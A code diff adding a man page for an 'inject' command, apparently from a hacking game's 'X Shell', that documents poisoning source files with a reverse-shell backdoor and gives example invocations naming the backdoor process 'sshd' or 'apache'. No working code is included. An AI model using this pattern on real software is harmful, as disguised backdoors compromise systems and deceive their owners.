@@ -1,0 +1,34 @@
+// Man page for inject
+manInject="INJECT(1)                        X Shell Manual                        INJECT(1)
+
+<b>NAME</b>
+    inject - Poison source file with rshell
+<b>SYNOPSIS</b>
+    <b>inject -i</b> IP <b>-p</b> PORT <b>-n</b> PROCESSNAME FILE
+    <b>inject</b> HELP FILE
+<b>DESCRIPTION</b>
+    Inject rshell backdoor code into a source file. Parameter order is
+    flexible, but FILE must be last. The help system automatically
+    pulls rshell server IP from favorites if configured.
+<b>OPTIONS</b>
+    <b>-i IP -p PORT -n PROCESSNAME FILE</b> - Inject Code
+      Inject rshell backdoor into source file.
+      IP: Rshell server address
+      PORT: Rshell server port
+      PROCESSNAME: Process name for the backdoor
+
+    <b>HELP FILE</b> - Interactive Help
+      Launch help system to guide injection process.
+<b>EXAMPLE:</b>
+    <color=#e4ff34># Inject Backdoor</color>
+    <b>inject -i</b> host.ip.addr <b>-p</b> 1222 <b>-n</b> sshd exploit.src
+    Inject rshell into exploit script
+
+    <b>inject -n</b> apache <b>-i</b> other.ip.addr <b>-p</b> 4444 web.src
+    Flexible parameter order
+
+    <color=#e4ff34># Use Help System</color>
+    <b>inject help malware.src</b>
+    Interactive injection with guidance
+<b>SEE ALSO</b>
+    <b>rshell</b>, <b>build</b>, <b>make</b>"
